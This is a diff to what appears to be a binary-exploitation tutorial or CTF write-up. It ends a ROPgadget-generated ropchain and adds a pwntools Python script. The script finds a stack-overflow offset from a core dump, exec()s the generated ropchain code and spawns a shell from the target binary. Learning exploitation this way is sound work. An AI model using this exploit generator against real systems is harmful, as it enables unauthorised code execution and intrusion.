@@ -89,5 +89,46 @@ p += pack('<I', 0x0807b48f) # inc eax ; ret
 p += pack('<I', 0x0807b48f) # inc eax ; ret
 p += pack('<I', 0x0807b48f) # inc eax ; ret
 p += pack('<I', 0x0806da85) # int 0x80
+```
 
+With this, we  can make a python script to exploit the binary:  
+> Run with python2.7
+```py
+import sys
+from pwn import *
+from subprocess import Popen, PIPE
+context.log_level = "DEBUG"
+# Run the binary and conenct to it at 127.0.0.1:1337
+
+def main():
+    # Create process and cause seg fault
+    proc = process(context.binary.path)
+    proc.sendline(cyclic(1024))
+    proc.wait()
+    proc.close()
+    # Get dump core and find offset
+    core = Coredump("./core")
+    offset = cyclic_find(core.fault_addr)
+    log.info("OFFSET: {}".format(offset))
+    # Generate exploit code with ROPgadget
+    STDOUT = Popen(["ROPgadget", "--ropchain", "--binary", context.binary.path], stdout=PIPE).communicate()[0]
+    code = STDOUT[STDOUT.find("#!"):].replace("\t", "")
+    log.info("Executing: \n" + code)
+    # Execute exploit to get ropchain var
+    exec(code)
+    ropchain = p
+    log.info("ROPChain Built: " + ropchain)
+    # Spawn interactive shell
+    proc = process(context.binary.path)
+    proc.sendline(fit({offset:ropchain}))
+    proc.interactive()
+    proc.close()
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: {} <binary> <addr:port>".format(sys.argv[0]))
+        sys.exit()
+    context.binary = sys.argv[1]
+    addr = sys.argv[2].split(":")
+    main()
 ```
